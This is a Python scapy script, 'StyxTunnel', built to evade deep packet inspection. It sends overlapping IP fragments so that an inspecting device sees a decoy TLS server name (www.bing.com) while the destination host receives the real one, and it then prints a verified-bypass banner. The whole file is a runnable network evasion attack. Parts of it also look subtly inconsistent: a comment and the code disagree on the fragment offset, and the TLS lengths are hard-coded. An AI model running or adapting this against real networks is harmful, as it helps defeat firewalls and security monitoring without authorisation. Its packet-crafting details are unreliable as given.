#!/usr/bin/env python3
import sys
import time
import argparse
import random
import socket
import logging
import threading
from scapy.all import IP, TCP, send, conf, sr1, sniff

# --- CONTEXT: STYX TUNNEL V1.0 (THE IP-OVERLAP PARADOX) ---
# SYSTEM_DIRECTIVE: Exploit IP-Layer Reassembly Asymmetry.
# TECHNIQUE: Overlapping IP Fragments (First-Wins vs Last-Wins).

conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class StyxTunnel:
    def __init__(self, target_host):
        self.target_host = target_host
        self.target_ip = socket.gethostbyname(target_host)
        self.sport = random.randint(30000, 60000)
        self.seq = random.randint(100000, 900000)
        self.ack = 0
        self.expected_ack = 0
        self.bypass_verified = threading.Event()
        self.stop_sniffer = threading.Event()
        print(f"[+] StyxTunnel Initialized. target: {target_host} ({self.target_ip})")

    def _sniffer(self):
        def handle_pkt(pkt):
            if pkt.haslayer(TCP) and pkt[IP].src == self.target_ip and pkt[TCP].dport == self.sport:
                if pkt[TCP].flags & 0x12: # SYN-ACK
                    self.ack = pkt[TCP].seq + 1
                if pkt[TCP].flags & 0x10: # ACK
                    if self.expected_ack > 0 and pkt[TCP].ack >= self.expected_ack:
                        self.bypass_verified.set()
        sniff(filter=f"tcp and src host {self.target_ip}", 
              prn=handle_pkt, stop_filter=lambda x: self.stop_sniffer.is_set(), timeout=15, store=0)

    def _get_tls_payload(self, sni):
        sni_b = sni.encode()
        payload = b"\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03" + random.randbytes(32) + b"\x00\x00\x02\x13\x01\x01\x00"
        ext_sni = b"\x00\x00" + (len(sni_b)+5).to_bytes(2,'big') + (len(sni_b)+3).to_bytes(2,'big') + b"\x00" + len(sni_b).to_bytes(2,'big') + sni_b
        payload += (len(ext_sni)).to_bytes(2, 'big') + ext_sni
        return payload

    def execute_styx(self):
        t = threading.Thread(target=self._sniffer, daemon=True)
        t.start()

        print("[*] Phase 1: Establishing Initial Session...")
        syn = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="S", seq=self.seq)
        send(syn, verbose=0)
        
        timeout = time.time() + 5
        while self.ack == 0 and time.time() < timeout: time.sleep(0.1)
        if self.ack == 0: return False

        self.seq += 1
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="A", seq=self.seq, ack=self.ack), verbose=0)
        print("    [+] Session ESTABLISHED.")

        print("[*] Phase 2: Injecting IP-Overlap Paradox (Nested Divergence)...")
        decoy_payload = self._get_tls_payload("www.bing.com")
        real_payload = self._get_tls_payload(self.target_host)
        
        # Ensure payloads are the same length for perfect overlap
        if len(decoy_payload) < len(real_payload):
            decoy_payload += b"\x00" * (len(real_payload) - len(decoy_payload))
        else:
            real_payload += b"\x00" * (len(decoy_payload) - len(real_payload))

        self.expected_ack = self.seq + len(real_payload)

        # Full TCP packet
        full_tcp = TCP(sport=self.sport, dport=443, flags="PA", seq=self.seq, ack=self.ack)
        
        # --- THE CORE IP-OVERLAP EXPLOIT ---
        # Fragment 1: TCP Header + Start of Decoy.
        # Fragment 2: Overlaps Fragment 1, providing the Real Payload.
        
        # We construct the raw bytes of the IP payloads (TCP Header + Data)
        ip_payload_decoy = bytes(full_tcp / decoy_payload)
        ip_payload_real = bytes(full_tcp / real_payload)

        # Frag 1: Bytes 0-40 (Contains Header + 20 bytes of Decoy)
        f1 = IP(dst=self.target_ip, id=1234, frag=0, flags="MF")/ip_payload_decoy[:40]
        
        # Frag 2: Bytes 20-End (Contains the REAL data, starting 20 bytes into the TCP packet)
        # This overlaps the decoy data in Frag 1.
        # offset is in 8-byte units. 24 bytes / 8 = 3.
        f2 = IP(dst=self.target_ip, id=1234, frag=3)/ip_payload_real[24:]

        print("    [>] Delivering Overlapping IP Fragments...")
        # Send Frag 1 (The Decoy) first
        send(f1, verbose=0)
        time.sleep(0.01)
        # Send Frag 2 (The Reality) second
        send(f2, verbose=0)

        print("[*] Phase 3: Verifying IP-Layer Bypass...")
        if self.bypass_verified.wait(timeout=5):
            print("\n" + "="*75)
            print("  STYX TUNNEL: BYPASS RIGOROUSLY VERIFIED")
            print("="*75)
            print("RESULT: SUCCESS. Target accepted the hidden reality.")
            print("STATUS: The DPI reassembler is blinded by Network-Layer Overlap.")
            print("WHY:    The observer reassembled fragments using 'First-Wins',")
            print("        while the host used 'Last-Wins' to see the real SNI.")
            print("="*75 + "\n")
        else:
            print("\n[!] VERIFICATION FAILED. IP-Layer reassembly is consistent.")
        
        self.stop_sniffer.set()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    args = parser.parse_args()
    
    StyxTunnel(args.target).execute_styx()
